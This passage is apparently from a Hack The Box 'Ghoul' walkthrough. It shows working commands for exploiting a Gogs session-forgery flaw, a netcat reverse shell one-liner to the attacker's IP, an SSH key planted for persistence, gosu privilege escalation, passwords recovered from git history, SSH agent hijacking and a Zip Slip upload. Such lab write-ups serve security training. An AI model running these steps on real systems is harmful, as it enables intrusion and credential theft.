<p>I found <code class="language-plaintext highlighter-rouge">172.18.0.2</code> running both SSH and some other service on port 3000. At this point it’s probably a good idea to start setting up some port forwarding. With the following I can access port 3000 through a double hop:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 2222:172.20.0.150:22 -i root.key root@10.10.10.101
ssh -i kaneki.backup -p 2222 -L 3000:172.18.0.2:3000 kaneki_pub@127.0.0.1
</code></pre></div></div>

<h3 id="exploiting-gogs-on-the-3rd-container">Exploiting Gogs on the 3rd container</h3>

<p>On port 3000 we find a Gogs application running:</p>

<p><img src="/assets/images/htb-writeup-ghoul/port3000.png" alt=""></p>

<p>The version is shown at the bottom of the page:</p>

<p><img src="/assets/images/htb-writeup-ghoul/gogs_version.png" alt=""></p>

<p>I tried various credentials and was able to get with pieces of info I found earlier: <code class="language-plaintext highlighter-rouge">AogiriTest / test@aogiri123</code></p>

<p><img src="/assets/images/htb-writeup-ghoul/gogs_logged.png" alt=""></p>

<p>There’s nothing on the Gogs application, no repo, nothing interesting.</p>

<p>Next I did some research and found there’s two CVE’s for this version: CVE-2018-18925 and CVE-2018-20303. Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a “..” session-file forgery in the file session provider in file. The other CVE is a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.</p>

<p>There’s already a nice exploit available on Github: <a href="https://github.com/TheZ3ro/gogsownz">https://github.com/TheZ3ro/gogsownz</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python3 gogsownz.py http://127.0.0.1:3000/ --burp -C "AogiriTest:test@aogiri123" -v --preauth --rce "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f" --cleanup
[!] Created Gogsownz
[i] Starting Gogsownz on: http://127.0.0.1:3000
[+] Loading Gogs homepage
[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916
[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.
[!] Creds found.
[!] Logging in...
[+] Performing login
[+] Logged in sucessfully as AogiriTest
[i] Exploiting pre-auth PrivEsc...
[+] Uploading admin session as attachment file
[+] Uploaded successfully, preparing cookies for the Path Traversal
[+] Admin session hijacked, trying to login as admin
[i] Signed in as kaneki, is admin True
[i] Current session cookie: '../attachments/9/4/94918be1-7932-44b5-8490-40ff628acf8c'
[+] Got UserID 1
[+] Repository created sucessfully
[+] Setting Git hooks
[+] Git hooks set sucessfully
[+] Fetching last commit...
[+] Got last commit
[+] Triggering the RCE with a new commit
</code></pre></div></div>

<p>I popped a shell as user <code class="language-plaintext highlighter-rouge">git</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.101.
Ncat: Connection from 10.10.10.101:42515.
/bin/sh: can't access tty; job control turned off
/data/git/gogs-repositories/kaneki/gogstest.git $ id
uid=1000(git) gid=1000(git) groups=1000(git)
</code></pre></div></div>

<p>I saved the kaneki public key to the <code class="language-plaintext highlighter-rouge">git</code> user folder in case I lose my shell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/data/git/.ssh $ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@kaneki-pc" &gt;&gt; authorized_keys
</code></pre></div></div>

<p>There’s not much <code class="language-plaintext highlighter-rouge">git</code> has access to, but I found an interesting  <code class="language-plaintext highlighter-rouge">gosu</code> suid binary:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/data/git $ find / -perm /4000 2&gt;/dev/null
[...]
/usr/sbin/gosu
/bin/su
</code></pre></div></div>

<p>I can get root access by just running it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~$ gosu root /bin/bash
3713ea5e4353:/data/git# cd
3713ea5e4353:~#
</code></pre></div></div>

<p>The root user directory contains a 7zip archive and a <code class="language-plaintext highlighter-rouge">session.sh</code> file with some credentials.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~# ls
aogiri-app.7z  session.sh
</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~# <span class="nb">cat </span>session.sh
<span class="c">#!/bin/bash</span>
<span class="k">while </span><span class="nb">true
</span><span class="k">do
  </span><span class="nb">sleep </span>300
  <span class="nb">rm</span> <span class="nt">-rf</span> /data/gogs/data/sessions
  <span class="nb">sleep </span>2
  curl <span class="nt">-d</span> <span class="s1">'user_name=kaneki&amp;password=12345ILoveTouka!!!'</span> http://172.18.0.2:3000/user/login
<span class="k">done</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">session.sh</code> logs in to the gogs application every 10 minuters as per the crontab.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3713ea5e4353:~# crontab -l
# do daily/weekly/monthly maintenance
# min	hour	day	month	weekday	command
*/15	*	*	*	*	run-parts /etc/periodic/15min
0	*	*	*	*	run-parts /etc/periodic/hourly
0	2	*	*	*	run-parts /etc/periodic/daily
0	3	*	*	6	run-parts /etc/periodic/weekly
0	5	1	*	*	run-parts /etc/periodic/monthly
*/10	*	*	*	*	/root/session.sh
</code></pre></div></div>

<p>I grabbed the 7zip file and extracted it locally on my Kali VM. It contains the skeleton for a Java application and the git metadata.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ls -la
total 60
drwxr-xr-x 5 root root  4096 May  6 12:28 .
drwxr-xr-x 3 root root 12288 May  6 12:19 ..
drwxr-xr-x 8 root root  4096 May  6 12:28 .git
-rw-r--r-- 1 root root   268 May  6 12:28 .gitignore
drwxr-xr-x 3 root root  4096 Dec 29 01:36 .mvn
-rwxr-xr-x 1 root root  9113 May  6 12:28 mvnw
-rw-r--r-- 1 root root  5810 May  6 12:28 mvnw.cmd
-rw-r--r-- 1 root root  1931 May  6 12:28 pom.xml
-rw-r--r-- 1 root root   124 May  6 12:28 README.md
drwxr-xr-x 4 root root  4096 Dec 29 01:36 src
</code></pre></div></div>

<p>First thing I did was check the git commit log for any interesting data:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># git log
commit e29ad435b1cf4d9e777223a133a5b0a9aaa20625 (HEAD -&gt; master)
Author: kaneki &lt;kaneki@aogiri.htb&gt;
Date:   Sat Dec 29 11:38:18 2018 +0530

    added service

commit b3752e00721b4b87c99ef58e3a54143061b20b99
Author: kaneki &lt;kaneki@aogiri.htb&gt;
Date:   Sat Dec 29 11:34:07 2018 +0530

    noro stop doing stupid shit

commit 813e0a518064778343ba54b64e16ad44c19900fb
Author: noro &lt;noro@aogiri.htb&gt;
Date:   Sat Dec 29 11:31:26 2018 +0530

    hello world!

commit ed5a88cbbc084cba1c0954076a8d7f6f5ce0d64b
Author: kaneki &lt;kaneki@aogiri.htb&gt;
Date:   Sat Dec 29 11:24:41 2018 +0530

    mysql support

commit 51d2c360b13b37ad608361642bd86be2a4983789
Author: kaneki &lt;kaneki@aogiri.htb&gt;
Date:   Sat Dec 29 11:22:02 2018 +0530

    added readme

commit bec96aaf334dc0110caa163e308d4e2fc2b8f133
Author: kaneki &lt;kaneki@aogiri.htb&gt;
Date:   Sat Dec 29 11:20:22 2018 +0530

    updated dependencies

commit 8b7452057fc35b5bd81a0b26a4bd2fe1220ab667
Author: kaneki &lt;kaneki@aogiri.htb&gt;
Date:   Sat Dec 29 11:15:14 2018 +0530

    update readme
</code></pre></div></div>

<p>Commit <code class="language-plaintext highlighter-rouge">b3752e00721b4b87c99ef58e3a54143061b20b99</code> seems interesting since kaneki is cleaning up Noro’s mess:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># git show b3752e00721b4b87c99ef58e3a54143061b20b99
commit b3752e00721b4b87c99ef58e3a54143061b20b99
[...]
 spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
-spring.datasource.username=root
-spring.datasource.password=root
+spring.datasource.username=kaneki
+spring.datasource.password=jT7Hr$.[nF.)c)4C
 server.address=0.0.0.0
</code></pre></div></div>

<p>Ahah! Found some root password here. Of course, nothing’s listening on port 3306 on any of the container but maybe I can use the root password on the <code class="language-plaintext highlighter-rouge">kaneki-pc</code> container:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ su
Password:
su: Authentication failure
</code></pre></div></div>

<p>Nope… Let’s keep looking.</p>

<p>Checking the git reflogs, I see the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># git reflog
647c5f1 (HEAD -&gt; master, origin/master) HEAD@{0}: commit: changed service
b43757d HEAD@{1}: commit: added mysql deps
b3752e0 HEAD@{2}: reset: moving to b3752e0
0d426b5 HEAD@{3}: reset: moving to 0d426b5
e29ad43 HEAD@{4}: reset: moving to HEAD^
0d426b5 HEAD@{5}: reset: moving to HEAD
0d426b5 HEAD@{6}: reset: moving to origin/master
0d426b5 HEAD@{7}: commit: update dependencies
e29ad43 HEAD@{8}: commit: added service
b3752e0 HEAD@{9}: commit: noro stop doing stupid shit
813e0a5 HEAD@{10}: commit: hello world!
ed5a88c HEAD@{11}: commit: mysql support
51d2c36 HEAD@{12}: commit: added readme
bec96aa HEAD@{13}: commit: updated dependencies
8b74520 HEAD@{14}: commit (initial): update readme
</code></pre></div></div>

<p>I diff’ed every commit and different password for the database: <code class="language-plaintext highlighter-rouge">7^Grc%C\7xEQ?tb4</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># git diff HEAD@{4}
[...]
-spring.datasource.url=jdbc:mysql://localhost:3306/db
+spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
 spring.datasource.username=kaneki
-spring.datasource.password=7^Grc%C\7xEQ?tb4
+spring.datasource.password=jT7Hr$.[nF.)c)4C
 server.address=0.0.0.0
</code></pre></div></div>

<h3 id="root-access-through-ssh-agent-hijack">Root access through SSH agent hijack</h3>

<p>The new found password works to get root access on the <code class="language-plaintext highlighter-rouge">kaneki-pc</code> container:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ su -l root
Password:
root@kaneki-pc:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kaneki-pc:~# ls
root.txt
root@kaneki-pc:~# cat root.txt
You've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....
</code></pre></div></div>

<p>As expected, I don’t have access to the real <code class="language-plaintext highlighter-rouge">root.txt</code> flag on this one.</p>

<p>Earlier I found that a user connects remotely then back using root’s account on the host. I can just wait until the next time it connects then hijack its ssh agent socket:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kaneki-pc:/tmp# ls -l
total 20
drwx------ 1 root       root       4096 Dec 16 07:36 ssh-1Oo5P5JuouKm
drwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16 07:36 ssh-FWSgs7xBNwzU
drwx------ 2 kaneki_adm kaneki_adm 4096 May  8 02:00 ssh-Y2CJdynAyJ
drwx------ 1 kaneki_pub kaneki     4096 Dec 16 07:36 ssh-jDhFSu7EeAnz
-rw------- 1 root       root        400 May  8 01:16 sshd-stderr---supervisor-b_s4zO.log
-rw------- 1 root       root          0 May  8 01:16 sshd-stdout---supervisor-rrVo6W.log

root@kaneki-pc:/tmp# cd ssh-Y2CJdynAyJ
root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# ls -l
total 0
srwxr-xr-x 1 kaneki_adm kaneki_adm 0 May  8 02:00 agent.216
root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# export SSH_AUTH_SOCK=agent.216

root@kaneki-pc:/tmp/ssh-Y2CJdynAyJ# ssh -p 2222 172.18.0.1
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)

[...]

Last login: Tue May  7 19:00:02 2019 from 172.18.0.200
root@Aogiri:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Aogiri:~# ls
log.sh  root.txt
root@Aogiri:~# cat root.txt
7c0f11...
</code></pre></div></div>

<h3 id="unintended-way-to-root-on-aogiri-container">Unintended way to root on Aogiri container</h3>

<p>Instead of using the SSH keys found in the backups directory I can use the Zip Slip vulnerability to upload my own SSH publicy key to the root directory’s SSH folder.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cp /root/.ssh/id_rsa.pub authorized_keys
# python evilarc.py -f root.zip -o unix -p "../../../../../../root/.ssh" authorized_keys
Creating root.zip containing ../../../../../../../../../../../../../../root/.ssh/authorized_keys
# curl -u admin:admin -F 'data=@root.zip' http://10.10.10.101:8080/upload
</code></pre></div></div>

<p>I can now log in as root:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh 10.10.10.101
Last login: Tue May  7 00:06:28 2019 from 172.20.0.1
root@Aogiri:~# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#containers" class="page__taxonomy-item" rel="tag">containers</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#git" class="page__taxonomy-item" rel="tag">git</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#gogs" class="page__taxonomy-item" rel="tag">gogs</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ssh" class="page__taxonomy-item" rel="tag">ssh</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#unintended" class="page__taxonomy-item" rel="tag">unintended</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#zipslip" class="page__taxonomy-item" rel="tag">zipslip</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-10-05T00:00:00+02:00">October 05, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-swagshop/" class="pagination--pager" title="Swagshop - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-writeup/" class="pagination--pager" title="Writeup - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
